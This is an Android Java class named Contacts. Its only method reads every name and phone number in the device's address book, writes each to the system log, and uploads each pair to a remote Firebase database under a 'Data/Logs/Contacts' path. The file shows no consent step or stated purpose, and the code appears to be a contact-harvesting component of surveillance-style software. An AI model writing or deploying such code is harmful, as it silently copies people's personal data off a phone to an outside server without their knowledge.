package com.hazyaz.temps.Contacts;

import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.UUID;


public class Contacts {

    private static final String TAG = "contactss";

    public void getContactList(ContentResolver contentResolver) {

        StringBuffer sb = new StringBuffer();
        ContentResolver cr = contentResolver;
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        sb.append(name);
                        sb.append(phoneNo);
                        sb.append("\n----------------------------------\n");
                        Log.i(TAG, "Name: " + name);
                        Log.i(TAG, "Phone Number: " + phoneNo);
                        String ranuid= UUID.randomUUID().toString();

                        DatabaseReference mDatabase = FirebaseDatabase.getInstance().getReference();

                        mDatabase.child(FirebaseAuth.getInstance().getCurrentUser().getUid()).child("Data").child("Logs").child("Contacts").child(ranuid).child("Name").setValue(name);
                        mDatabase.child(FirebaseAuth.getInstance().getCurrentUser().getUid()).child("Data").child("Logs").child("Contacts").child(ranuid).child("Number").setValue(phoneNo);

                    }

                    pCur.close();
                }
            }
        }
        if (cur != null) {
            cur.close();
        }
    }


}
